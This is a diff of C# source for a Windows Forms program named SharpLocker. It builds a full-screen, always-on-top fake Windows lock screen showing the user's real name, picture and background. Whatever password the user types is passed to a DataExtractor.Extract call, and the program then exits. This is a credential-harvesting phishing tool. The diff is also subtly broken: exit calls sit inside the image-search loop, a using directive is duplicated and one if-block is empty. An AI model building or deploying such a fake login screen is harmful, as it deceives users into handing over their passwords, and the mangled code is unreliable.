@@ -1,14 +1,20 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.ComponentModel;
+using System.Data;
 using System.Diagnostics;
 using System.Drawing;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Drawing.Drawing2D;
-using System.Text;
+using System.Net;
+using System.Runtime.InteropServices;
+using Microsoft.Win32;
+
 
 namespace SharpLocker
 {
@@ -50,43 +56,49 @@ namespace SharpLocker
             BackgroundImage = myimage;
 
             BackgroundImageLayout = ImageLayout.Stretch;
-            TopMost = true;
 
-            string userName = Environment.UserName;
+            this.TopMost = true;
+            string userName = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
             UserNameLabel.Text = userName;
-            UserNameLabel.BackColor = Color.Transparent;
+            UserNameLabel.BackColor = System.Drawing.Color.Transparent;
 
-            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
-            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
-            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
-            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
-            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;
+            int percentHeight = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100);
+            int middleWidth = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width) / 2);
+            int tbsize = 28;
+            int tbwidth = 200;
 
-            PasswordTextBox.Top = usernameloch;
-            PasswordTextBox.UseSystemPasswordChar = true;
-            ProfileIcon.Top = usericonh;
-            SubmitPasswordButton.Top = buttonh;
-            UserNameLabel.Top = usernameh;
-            LockedLabel.Top = locked;
-            PasswordTextBox.UseSystemPasswordChar = true;
+            ProfileIcon.Top = percentHeight * 27;
+            ProfileIcon.Left = middleWidth - 100;
 
-            //Get the username. This returns Domain\Username
-            string userNameText = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            UserNameLabel.Top = percentHeight * 51;
+            UserNameLabel.Left = middleWidth - 201;
 
-            //Set the text
-            UserNameLabel.Text = userNameText.Split('\\')[1];
+            SubmitPasswordButton.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
+            SubmitPasswordButton.Left = middleWidth + (tbwidth / 2) - 11;
 
-            //https://stackoverflow.com/questions/7731855/rounded-edges-in-picturebox-c-sharp
-            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
-            gp.AddEllipse(0, 0, ProfileIcon.Width - 3, ProfileIcon.Height - 3);
-            Region rg = new Region(gp);
-            ProfileIcon.Region = rg;
-            ProfileIcon.Image = GetUserTile(userNameText.Split('\\')[1]);
+            show.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
+            show.Left = middleWidth + (tbwidth / 2) - 45;
 
+            PasswordTextBox.Top = Convert.ToInt32(percentHeight * 59.4);
+            PasswordTextBox.Size = new System.Drawing.Size(tbwidth-4, Convert.ToInt32(tbsize));
+            PasswordTextBox.Left = middleWidth - (tbwidth / 2) - 12;
 
+            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize*0.125));
+            textboxBackground.Left = Convert.ToInt32(middleWidth - (tbwidth / 2) - (tbsize * 0.125) - 12);
+            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)), Convert.ToInt32(tbsize*1.25));
+
+            power.Left = Screen.PrimaryScreen.Bounds.Width - 60;
+            power.Top = Screen.PrimaryScreen.Bounds.Height - 60;
+
+            accessibility.Left = Screen.PrimaryScreen.Bounds.Width - 110;
+            accessibility.Top = Screen.PrimaryScreen.Bounds.Height - 60;
+
+            language.Left = Screen.PrimaryScreen.Bounds.Width - 160;
+            language.Top = Screen.PrimaryScreen.Bounds.Height - 60;
 
             foreach (var screen in Screen.AllScreens)
             {
+
                 Thread thread = new Thread(() => WorkThreadFunction(screen));
                 thread.Start();
             }
@@ -94,43 +106,16 @@ namespace SharpLocker
 
         }
 
-        public string getSpotlightImage()
-        {
-            //Creds to Ascensao
-            //https://github.com/Pickfordmatt/SharpLocker/pull/20
-
-
-            //Get Windows Spotlight Images Location Path.      C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\
-            string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");
-
-            /* Save the name of the larger image from spotlight dir.
-             * Normally the larger image present in this directory is the current lock screen image. */
-            string img_name = "";
-
-            //Save image full path
-            string img_path = "";
-
-            DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
-            long largestSize = 0;
-            foreach (var fi in folderInfo.GetFiles())
-            {
-                if (fi.Length > largestSize)
-                {
-                    largestSize = fi.Length;
-                    img_name = fi.Name;
-                }
-            }
-
-            img_path = Path.Combine(spotlight_dir_path, img_name);
-
-            return img_path;
-        }
-
-
         public void WorkThreadFunction(Screen screen)
         {
             try
             {
+                if (screen.Primary == true)
+                {
+
+
+                }
+
                 if (screen.Primary == false)
                 {
                     int mostLeft = screen.WorkingArea.Left;
@@ -148,14 +133,38 @@ namespace SharpLocker
                     }
                 }
             }
-            catch (Exception ex)
+            catch { }
+        }
+        public string getSpotlightImage()
+        {
+            //Get Windows Spotlight Images Location Path. (C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\)
+            string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");
+
+            /* Save the name of the larger image from spotlight dir.
+             * Normally the larger image present in this directory is the current lock screen image. */
+            string img_name = "";
+
+            //Save image full path
+            string img_path = "";
+
+            DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
+            long largestSize = 0;
+            foreach (var fi in folderInfo.GetFiles())
             {
                 // log errors
                 Taskbar.Show();
                 System.Windows.Forms.Application.Exit();
-            }
-        }
 
+                if (fi.Length > largestSize)
+                {
+                    largestSize = fi.Length;
+                    img_name = fi.Name;
+                }
+            }
+            img_path = Path.Combine(spotlight_dir_path, img_name);
+
+            return img_path;
+        }
 
         protected override CreateParams CreateParams
         {
@@ -170,20 +179,26 @@ namespace SharpLocker
 
         protected override void OnClosing(CancelEventArgs e)
         {
-            Taskbar.Show();
             base.OnClosing(e);
         }
 
-        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
+        private void show_MouseDown(object sender, MouseEventArgs e)
         {
-            Console.WriteLine(PasswordTextBox);
+            PasswordTextBox.UseSystemPasswordChar = false;
         }
 
-        private void SubmitPasswordButton_Click(object sender, EventArgs e)
+        private void show_MouseUp(object sender, MouseEventArgs e)
+        {
+            PasswordTextBox.UseSystemPasswordChar = true;
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
         {
             DataExtractor.Extract(PasswordTextBox.Text);
+
             Taskbar.Show();
             Application.Exit();
         }
+
     }
 }
